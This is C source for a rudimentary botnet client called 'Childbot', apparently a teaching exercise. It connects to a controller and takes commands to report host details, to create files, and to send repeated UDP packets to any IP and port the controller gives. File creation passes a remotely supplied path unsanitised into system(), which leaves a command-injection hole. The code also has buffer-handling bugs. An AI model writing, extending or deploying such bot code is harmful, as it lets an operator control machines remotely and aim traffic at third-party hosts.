#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <time.h>

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char **argv)
{
   int client_len,sender_len;
   int client_sockfd;
   int sender_sockfd;
   int i;
   int ret;
   int nread;
   int packet_num,port;
   char id[2];
   char bot_number[2];
   char buf_in[255];
   char buf_get[255];
   char message[255];
   char instruction[255];
   char read_option[255];
   char route[255];
   char makefile[255];
   char hostname[255];
   char date[255];
   char ip_addr[255];
   char *temp;
   char packet_message[255];

   FILE *fp;
   struct sockaddr_in clientaddr;
   struct sockaddr_in sender;
   struct utsname buf;

   uname(&buf);
   time_t now;
   client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
   clientaddr.sin_family = AF_INET;
   clientaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
   clientaddr.sin_port = htons(atoi(argv[2]));

   client_len = sizeof(clientaddr);
   sender_len = sizeof(sender);

   if(connect(client_sockfd, (struct sockaddr *)&clientaddr, client_len) < 0)
   {
       perror("Connect error : ");
       exit(0);
   }
   strncpy(id,argv[1],2);

   write(client_sockfd,id,2);

   while(1)
   {
       memset(buf_get,'\0',255);
       memset(message,'\0',255);
       memset(route,'\0',255);
       memset(makefile,'\0',255);
       memset(date,'\0',255);
       if(read(client_sockfd,buf_get,255) <= 0)
       {
           close(client_sockfd);
           exit(1);
       }

       else if(strlen(buf_get) >= 2)
       {
           strncpy(message,buf_get,sizeof(buf_get));
           temp = strtok(message," ");
           strncpy(instruction,temp,sizeof(temp));
    
           if(strstr(instruction,"read"))
           {
               temp = strtok(NULL," ");
               strncpy(bot_number,temp,sizeof(temp));

               if(bot_number[0] == id[0] && bot_number[1] == id[1])
               {
                   temp = strtok(NULL," ");
                   strncpy(read_option,temp,sizeof(temp));
                   if(strstr(read_option,"host"))
                   {
                       sprintf(hostname,"Childbot #%c%c : %s:%s:%s:%s:%s",id[0],id[1],buf.sysname,buf.nodename,buf.release,buf.version,buf.machine);
                       write(client_sockfd,hostname,sizeof(hostname));
                   }
                   else if(strstr(read_option,"date"))
                   {
                       time(&now);
                       sprintf(date,"Childbot #%c%c : %s",id[0],id[1],ctime(&now));
                       write(client_sockfd,date,sizeof(date));
                   }
               }
           }
           else if(strstr(instruction,"create"))
           {
               temp = strtok(NULL," ");
               strncpy(bot_number,temp,sizeof(temp));

               if(bot_number[0] == id[0] && bot_number[1] == id[1])
               {
                   temp = strtok(NULL," ");
                   strncpy(route,temp,sizeof(route));
                   for(i=0;i<sizeof(route);i++)
                   {
                       if(route[i] == '\n')
                       {
                           route[i] = '\0';
                           break;
                       }
                   }
                   sprintf(makefile,"touch %s",route);
    
                   if(system(makefile) == 0)
                   {
                       if((fp = fopen(route,"a"))==NULL)
                       {
                           write(client_sockfd,"writing file failed",19);
                           break;
                       }
                       fprintf(fp,"Childbot #%c%c\n",id[0],id[1]);
                       write(client_sockfd,"writing file complete",21);
                       fclose(fp);
                   }
                   else
                       write(client_sockfd,"file creation fail",18);
               }
           }
           else if(strstr(instruction,"send"))
           {
               memset(ip_addr,'\0',255);
               temp = strtok(NULL," ");
               packet_num = atoi(temp);
               temp = strtok(NULL," ");
               strncpy(ip_addr,temp,sizeof(ip_addr));
               temp = strtok(NULL," ");
               port = atoi(temp);

               sender.sin_family = AF_INET;
               sender.sin_addr.s_addr = inet_addr(ip_addr);
               sender.sin_port = htons(port);
               sprintf(packet_message,"This message is from bot %c%c",id[0],id[1]);

               if((sender_sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0)
                   error("socket error");
               for(i=0;i<packet_num;i++)
               {
                   if(ret = sendto(sender_sockfd,packet_message,sizeof(packet_message),0,(struct sockaddr *)&sender,sizeof(sender)) < 0)
                       error("send error");
                   sleep(1);
               }
               write(client_sockfd,"sending packet complete",23);
           
           }
       }
   }
   return 0;
}

